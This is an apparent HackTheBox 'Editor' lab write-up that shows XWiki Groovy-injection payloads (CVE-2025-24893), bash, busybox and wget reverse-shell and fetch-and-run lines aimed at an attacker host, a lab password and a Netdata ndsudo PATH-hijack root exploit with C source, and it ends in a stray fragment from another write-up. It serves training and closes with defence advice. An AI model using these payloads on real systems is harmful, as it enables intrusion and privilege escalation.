HackTheBox Editor - Complete Writeup
====================================

Machine Information
-------------------

*   **Name:** Editor
    
*   **OS:** Linux (Ubuntu 22.04)
    
*   **Difficulty:** Easy
    
*   **IP Address:** 10.10.11.80
    

Overview
--------

Editor is an Easy-rated Linux machine featuring an outdated XWiki instance vulnerable to unauthenticated remote code execution. The exploitation path involves leveraging CVE-2025-24893 for initial access, discovering database credentials for lateral movement via SSH, and exploiting a misconfigured Netdata ndsudo SUID binary through CVE-2024-32019 for privilege escalation to root.

Enumeration
-----------

### Initial Port Scan

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   nmap -p- --min-rate 10000 10.10.11.80   `

**Results:**

*   Port 22/tcp: OpenSSH 8.9p1 Ubuntu
    
*   Port 80/tcp: nginx 1.18.0 (Ubuntu)
    
*   Port 8080/tcp: Jetty 10.0.20
    

### Detailed Service Scan

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   nmap -p 22,80,8080 -sCV 10.10.11.80   `

**Key Findings:**

*   HTTP on port 80 redirects to http://editor.htb
    
*   Port 8080 hosts XWiki with WebDAV enabled
    
*   XWiki version: 15.10.8 (visible at bottom of the page)
    

### Host Configuration

Add the discovered hostname to /etc/hosts:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   echo "10.10.11.80 editor.htb wiki.editor.htb" | sudo tee -a /etc/hosts   `

### Web Application Enumeration

**Port 80 (editor.htb):**

*   A code editor website interface
    
*   Documentation link redirects to wiki.editor.htb
    

**Port 8080 (wiki.editor.htb):**

*   XWiki instance running version 15.10.8
    
*   robots.txt reveals multiple disallowed paths
    
*   Version information available at page footer
    

Initial Access - CVE-2025-24893 (XWiki RCE)
-------------------------------------------

### Vulnerability Research

XWiki version 15.10.8 contains an unauthenticated remote code execution vulnerability in the SolrSearch macro that allows Groovy script injection.

**CVE Details:**

*   **CVE ID:** CVE-2025-24893
    
*   **Affected Versions:** XWiki < 15.10.11, < 16.4.1, < 16.5.0RC1
    
*   **Impact:** Unauthenticated Remote Code Execution via Groovy injection
    

### Vulnerability Testing

Test if the instance is vulnerable:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   }}}{{async async=false}}{{groovy}}println("Hello from" + " search text:" + (23 + 19)){{/groovy}}{{/async}}   `

If the RSS feed title shows "Hello from search text:42", the instance is vulnerable.

### Exploitation Method

**Option 1: Using Public Exploit**

Clone a public PoC:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   git clone   cd CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC  chmod +x CVE-2025-24893-dbs.py   `

Set up listener:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   nc -lvnp 4444   `

Run the exploit:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   python3 CVE-2025-24893-dbs.py  # Target URL:   # Attacker IP:   # Attacker Port: 4444   `

**Option 2: Manual Exploitation**

Create a reverse shell script:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   cat > shell.sh << 'EOF'  #!/bin/bash  bash -i >& /dev/tcp//4444 0>&1  EOF   `

Start a Python HTTP server:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   python3 -m http.server 80   `

Start netcat listener:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   nc -lvnp 4444   `

Upload the shell script via XWiki:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   }}}{{async async=false}}{{groovy}}println("wget -qO /tmp/shell.sh http:///shell.sh".execute().text){{/groovy}}{{/async}}   `

Execute the shell script:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   }}}{{async async=false}}{{groovy}}println("bash /tmp/shell.sh".execute().text){{/groovy}}{{/async}}   `

**Option 3: Direct Command Execution**

Use busybox for direct reverse shell:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   python3 CVE-2025-24893.py -t  -c 'busybox nc  4444 -e /bin/bash'   `

### Shell Upgrade

Once you receive the reverse shell as the xwiki user, upgrade to a fully interactive TTY:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   python3 -c 'import pty;pty.spawn("/bin/bash")'  # Press Ctrl+Z  stty raw -echo; fg  export TERM=xterm   `

Lateral Movement - User Access
------------------------------

### Enumeration as xwiki User

Check system users:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   grep -E "(/bin/bash|/bin/sh)" /etc/passwd   `

**Discovered users:**

*   root
    
*   oliver (UID 1000)
    

### Database Credential Discovery

XWiki stores database credentials in configuration files. The primary configuration file is located at:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   cat /etc/xwiki/hibernate.cfg.xml   `

Look for database connection strings:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   grep -i "pass" /etc/xwiki/hibernate.cfg.xml   `

**Discovered Credentials:**

*   Username: xwiki
    
*   Password: theEd1t0rTeam99
    

### Password Reuse - SSH Access

Test if the database password works for the oliver user:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ssh oliver@editor.htb  # Password: theEd1t0rTeam99   `

**Success!** The password is reused for SSH access.

### User Flag

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   cat /home/oliver/user.txt   `

Privilege Escalation - Root Access
----------------------------------

### System Enumeration

Check for SUID binaries:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   find / -perm -4000 -type f 2>/dev/null   `

Check listening services:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ss -tulnp   `

**Key findings:**

*   MySQL on 127.0.0.1:3306
    
*   Netdata on 127.0.0.1:19999
    
*   Multiple internal services
    

### Netdata Discovery

Navigate to the Netdata directory:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   cd /opt/netdata  ls -la   `

Check Netdata version:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   /opt/netdata/usr/sbin/netdata -V   `

Version: 1.45.2

Examine the plugins directory:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ls -la /opt/netdata/usr/libexec/netdata/plugins.d/   `

**Critical finding:** The ndsudo binary has the SUID bit set:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   -rwsr-sr-x 1 root netdata ndsudo   `

Notice that the user oliver is a member of the netdata group:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   groups oliver  # Output: oliver adm netdata   `

### CVE-2024-32019 - Netdata ndsudo Privilege Escalation

The ndsudo tool shipped with Netdata allows privilege escalation through PATH manipulation, as it doesn't properly validate the search path when executing commands.

**Vulnerability Details:**

*   **CVE ID:** CVE-2024-32019
    
*   **Affected Versions:** Netdata < 1.45.3
    
*   **Impact:** Local privilege escalation via PATH injection
    

### Exploitation Steps

The ndsudo binary executes certain commands with root privileges. One of these commands is nvme-list, which internally calls the nvme binary without using an absolute path.

**Step 1: Create a Malicious Binary**

Create a simple C program that spawns a root shell:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   cd /tmp  cat > exploit.c << 'EOF'  #include   #include   int main() {      setuid(0);      setgid(0);      execl("/bin/bash", "bash", NULL);      return 0;  }  EOF   `

**Step 2: Compile the Exploit**

On your local machine:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   gcc exploit.c -o nvme   `

Transfer to the target:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # On attacker machine  python3 -m http.server 8000  # On target machine  cd /tmp  wget http://:8000/nvme  chmod +x nvme   `

**Step 3: Modify PATH and Execute**

Prepend /tmp to the PATH variable so our malicious nvme is found first:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   cd /tmp  export PATH=/tmp:$PATH   `

Execute ndsudo with the nvme-list command:

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list   `

**Result:** A root shell is spawned!

### Root Flag

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   cat /root/root.txt   `

Key Takeaways
-------------

1.  **Outdated Software:** The XWiki instance running version 15.10.8 was vulnerable to unauthenticated RCE, demonstrating the importance of keeping software updated.
    
2.  **Credential Reuse:** Database credentials were reused for SSH access, highlighting poor password management practices.
    
3.  **SUID Misconfiguration:** The ndsudo binary with SUID permissions and improper PATH validation allowed privilege escalation.
    
4.  **Defense Recommendations:**
    
    *   Apply security patches promptly
        
    *   Avoid password reuse across services
        
    *   Implement least privilege principles for SUID binaries
        
    *   Use absolute paths in privileged scripts
        
    *   Regularly audit system configurations
        

Tools Used
----------

*   nmap - Network scanning
    
*   Burp Suite (optional) - Request interception
    
*   Python - HTTP server and exploit execution
    
*   netcat - Reverse shell listener
    
*   gcc - Compiling exploit code
    

References
----------

*   CVE-2025-24893: [https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-c4mg-fvmm-vqhg](https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-c4mg-fvmm-vqhg)
    
*   CVE-2024-32019: [https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93](https://github.com/netdata/netdata/security/advisories/GHSA-pmhq-4cxq-wj93)
    
*   XWiki Security Advisory
    
*   Netdata Security Bulletin
    

**Author's Note:** This writeup is for educational purposes only. Always obtain proper authorization before testing security vulnerabilities on any system.

oliver@editor:/dev/shm$ ls -l /tmp/0xdf -rwsrwsrwx 1 root root 1396520 Aug 9 21:34 /tmp/0xdf

I’ll run it (with -p to not drop the SetUID privs):

oliver@editor:/dev/shm$ /tmp/0xdf -p 0xdf-5.1#

And get root.txt:

0xdf-5.1# cat /root/root.txt